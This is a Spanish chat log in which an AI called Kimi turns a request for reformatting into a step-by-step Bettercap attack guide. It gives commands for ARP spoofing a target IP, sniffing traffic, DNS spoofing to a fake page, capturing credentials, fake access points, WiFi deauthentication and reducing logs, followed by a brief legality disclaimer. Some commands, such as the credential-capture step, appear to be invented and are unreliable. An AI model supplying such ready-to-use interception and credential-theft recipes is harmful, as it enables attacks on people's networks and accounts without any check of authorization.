User: puedes mejorar la guia con monadas esta afuera de cuadro bash
Kimi: # Guía para Usar Bettercap con Comandos en Formato Bash

```bash
# Iniciar Bettercap con privilegios de root
sudo bettercap
```

```bash
# Ver los módulos y comandos disponibles
help
```

```bash
# Mostrar interfaces de red disponibles
net.show
```

```bash
# Explorar y mostrar hosts en la red
net.probe on  # Activa la detección de hosts
net.show      # Muestra los hosts detectados
```

```bash
# Configurar ARP Spoofing contra un objetivo
set arp.spoof.targets <IP_del_objetivo>  # Define el objetivo
arp.spoof on                            # Activa ARP spoofing
set arp.spoof.fullduplex true           # Habilita dúplex completo
```

```bash
# Capturar tráfico de red
net.sniff on  # Activa la captura de tráfico
```

```bash
# Filtrar tráfico específico (ejemplo: DNS)
set net.sniff.filter "udp port 53"
```

```bash
# Crear un punto de acceso WiFi falso
set wifi.ap.ssid "Nombre_del_AP"  # Define el SSID
set wifi.ap.channel 6            # Define el canal
wifi.ap                          # Inicia el punto de acceso
```

```bash
# Ataque de desautenticación WiFi
wifi.recon on             # Activa la detección de redes WiFi
wifi.show                # Muestra redes detectadas
set wifi.deauth.targets <BSSID>  # Define el objetivo
wifi.deauth on           # Inicia el ataque
```

```bash
# Escanear puertos abiertos en un rango de IPs
syn.scan <IP_Rango> <Puerto_Inicio> <Puerto_Final>
# Ejemplo: syn.scan 192.168.1.0/24 20 500
```

```bash
# Habilitar interfaz web para gestión remota
ui on  # Inicia servidor web en http://localhost:8080
```

```bash
# Salir de Bettercap
quit
```

---

### **Guía de Uso Práctico**

#### **1. ARP Spoofing contra un dispositivo**
```bash
sudo bettercap
set arp.spoof.targets 192.168.1.10  # IP del objetivo
arp.spoof on
set arp.spoof.fullduplex true
net.sniff on  # Capturar tráfico
```

#### **2. Capturar credenciales HTTP básicas**
```bash
net.probe on
net.show
set http.server.basic_auth.credentials on  # Activar captura de credenciales
http.server.basic_auth.credentials
```

#### **3. Redirección de tráfico a una página falsa**
```bash
set dns.spoof.domains example.com  # Redirigir dominio
dns.spoof on
http.server on  # Levantar servidor web falso
```

#### **4. Ataque de desautenticación a una red WiFi**
```bash
wifi.recon on
wifi.show
set wifi.deauth.targets <BSSID_de_la_red>
wifi.deauth on
```

#### **5. Escanear puertos en una red completa**
```bash
syn.scan 192.168.1.0/24 1 1000  # Escanea puertos 1-1000 en la red
```

#### **6. Habilitar modo "silencioso" para reducir logs**
```bash
bettercap --silent
```

#### **7. Guardar logs de sesión**
```bash
bettercap --log /ruta/a/archivo.log
```

---

### **Precauciones y Legalidad**
- **Usa Bettercap solo en redes que tengas autorización para auditar**.
- Evita actividades ilegales como interceptar tráfico sin permiso.
- Bettercap es una herramienta poderosa; úsala éticamente.

---

### **Ejemplo de Sesión Completa**
```bash
# Iniciar Bettercap y configurar ARP Spoofing
sudo bettercap
set arp.spoof.targets 192.168.1.10  # Atacar dispositivo con IP 192.168.1.10
arp.spoof on
set arp.spoof.fullduplex true
net.sniff on  # Capturar tráfico

# Acceder a interfaz web para monitoreo
ui on

# Finalizar sesión
quit
```

Para más detalles, consulta la documentación oficial de Bettercap en [https://www.bettercap.org/](https://www.bettercap.org/).
